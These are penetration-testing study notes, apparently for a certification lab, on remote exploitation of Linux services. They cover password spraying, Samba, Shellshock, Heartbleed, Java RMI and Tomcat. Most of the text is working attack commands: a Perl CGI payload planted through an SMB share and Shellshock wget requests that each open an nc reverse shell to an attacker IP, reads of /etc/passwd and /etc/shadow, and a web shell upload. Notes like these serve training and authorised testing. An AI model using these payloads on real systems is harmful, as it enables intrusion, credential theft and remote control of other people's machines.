LINUX REMOTE EXPLOITATION:

	PASSWORD SPRAY ATTACK:

		Concept of using a list of as many users as possible with trying the same password
			A concept of this is used within eJPT black box when you use LETMEIN as the password and have a username list
		AKA Reverse Brute Force Attack
		
	Password Spray with smtp:

		Utilize the smtp-user-enum that we have learned in the last section

			https://github.com/insidetrust/statistically-likely-usernames
		
		Now that we have a username list we can use a metasploit module for password spray attacking

			msf > use auxiliary/scanner/smtp/smtp_enum
			set rhosts
			set user_file users.txt (or whatever you named it)
			run

		When completed we can create a list of valid_users.txt
		Now lets use some common passwords, put one at the most 2 passwords in the file
			things such as Spring2020 and letmein
		

		Lets see what other services we may be able to use password spraying against
			nmap -sT 192.168.1.2 --open --max-retries 1 -n
		Now that we have users (from smtp) and some services we can use hydra to attack the target
			After we find a target we can see what other computers that user may be able to login to
		We can also use hydra to see a larger amount of servers (lets say there are a few computers running ssh)
			hydra -l david -p Spring2018 -M ssh_servers.txt ssh (ssh_servers.txt is a file containing different IP addresses, one per line that have ssh enabled)
		We can also use Metasploit's smb_login scanner module to try to login to SMB services
			metasploit also has an owa_login that can be used (this is in the slides may be in the test)
		
	EXPLOITING SAMBA:
		
	Samba Usermap Script:
	
		nmap --script smb-os-discovery -p445 192.168.1.2
			This should show us the Samba version
				We can then use that information to look on searchsploit, in metasploit or on google
		Within the slides they talk about username map script exploitation
			use exploit/multi/samba/usermap_script
				set rhost
				set lhost
				run

	Samba Symlink Directory Traversal:		

		smbmap -H 192.168.1.2
			Look for read and write access
		msf > use auxiliary/admin/smb/samba_syslink_traversal
			set rport
			set rhost
			set SBMSHARE (which ever had read/write access)	
			set SMBTARGET rootfs (the root file system)
			run
		smbclient \\\\192.168.1.2\\(access shared) -N
			smbclient \\\\192.168.1.2\\tmp -N
			you should now see rootfs directory in that share
			now login to smb
			cd to rootfs and you can use get and put commands
				cd etc
				get passwd
				get shadow
		We can also use the tar command (when in smb)
			tar c ../tmp/all_files.tar *
			this will download all the files to the local machine
				on local machine tar xf /tmp/allfiles.tar
				grep -r "password" * 2>&1 /dev/null
					hopefully we can find some passwords that way
		If you find index.pl in a www share, there are things we can do with that
			index.pl is a perl script
			we can get that index.pl and then use cat to see what it contains
			first try to put something in the smb server
				in kali make a test.pl then on smb do put test.pl
				if successful then we can put files
				in the perl file we can put something like the following just to make sure
					#!/usr/bin/perl
					print "Content-type: text/html\n\n";
					system("id");
				now go to the web server
					192.168.1.2/test.pl
				you should get the id information
			Now we can try and get a reverse shell using perl
				http://pentestmonkey.net/tools/web-shells/perl-reverse-shell
			Open a listener with netcat
				nc -lvnp 1234
			Go to webpage
				192.168.1.2/rev.pl
			We should get a reverse shell
		Another way to do the above
			We could also do this without using pentest monkey
			in our test.pl file change it to have it connect back to us
				#!/usr/bin/perl
				print "Content-type: text/html\n\n";
				system ("nc 192.168.1.49 1234 -e /bin/sh");

	EXPLOITING SHELLSHOCK:
		
		First we are going to use dirsearch
			dirsearch.py -u http://192.168.1.2/ -e cgi -r
		Find cgi files that we can go to, such as /cgi-bin/login.cgi
		Now we can use an nmap script to see if this is vulnerable to shellshock
			nmap --script http-shellshock --script-args uri=/cgi-bin/login.cgi 192.168.1.2 -p 80
		Now to exploit shellshock
			wget -U () { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://192.168.1.2/cgi-bin/login.cgi && cat login.cgi
		If this worked we should see the target systems etc/passwd file
		Now setup netcat and create a reverse shell
			nc -lvnp 1234
			wget -U "() {foo;};echo; /bin/nc 192.168.1.49 1234 -e /bin/sh" http://192.168.1.2/cgi-bin/login.cgi
	
	EXPLOITING HEARTBLEED:
		
		OpenSSL versions 1.0.1 through 1.0
		nmap --script ssl-heartbleed 192.168.1.2
		msf> use auxiliary/scanner/ssl/openssl_heartbleed
			set rhosts
			show actions
			set action DUMP
			run
		now look where the information was dumped and you may be able to find username and passwords
			IF YOU DO NOT GET INFORMATION THE FIRST TIME, TRY AGAIN THIS IS LEAKING DATA FROM MEMORY SO IT WILL BE DIFFERENT
	
	EXPLOITING JAVA RMI REGISTRY:
		
		nmap -sT 192.168.1.2 -p 1099 -sV or msf > use exploit/multi/misc/java_rmi_server
			set rhosts
			set ssl true (you may need to make your own cert to get around IDS)
			run -j
	
	EXPLOITING APACHE TOMCAT:
		
		msf > use auxiliary/scanner/http/tomcat_mgr_login
			set Stop_ON_SUCCESS true
			set rport (most likely 8180)
			set rhosts 192.168.1.2
			run
		
			upload a war file when you get access
				one spot (if still there) is /usr/share/laudanum which has a cmd.war file in it
			Now browse to URL
				192.168.1.2:8180/cmd/cmd.jsp
				we can now execute commands on the system
			I have also used reverse shells and started a listener to connect back to me
		
		
